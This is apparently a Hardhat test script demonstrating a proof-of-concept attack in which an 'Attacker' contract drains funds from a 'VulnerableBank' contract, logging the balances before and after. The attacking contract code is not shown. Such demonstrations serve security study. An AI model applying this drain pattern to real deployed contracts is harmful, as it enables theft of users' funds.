const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("///// Attack Bank \\\\\ (PoC)", function () {
    let bank, attacker;
    let deployer, hood;
    beforeEach(async function () {
        const Bank = await ethers.getContractFactory("VulnerableBank");
        bank = await Bank.deploy();
        await bank.deployed();


        const Attacker = await ethers.getContractFactory("Attacker");
        attacker = await Attacker.deploy(bank.address); // get-in to target contract with blueprint (bank.address)
        await attacker.deployed();

        [deployer, hood] = await ethers.getSigners();
    });
    it("Connect 001", async function () {
        const z = await ethers.provider.getBalance(hood.address);
        console.log(`Attacker's Balacnes before (${z})`);
        await bank.connect(deployer).deposit({ value: ethers.utils.parseEther("2") });
        const banktake = await ethers.provider.getBalance(bank.address);
        console.log(` Bank withdraws (${banktake})`);


        const tx001 = await attacker.connect(hood).fire({ value: ethers.utils.parseEther("1") });
        await tx001.wait();


        const bankAfter = await ethers.provider.getBalance(bank.address);
        console.log(`Bank After (${bankAfter})`);

        const attackAfter = await ethers.provider.getBalance(hood.address);
        console.log(`Attacker's Balances After robering (${attackAfter})`);

    });
});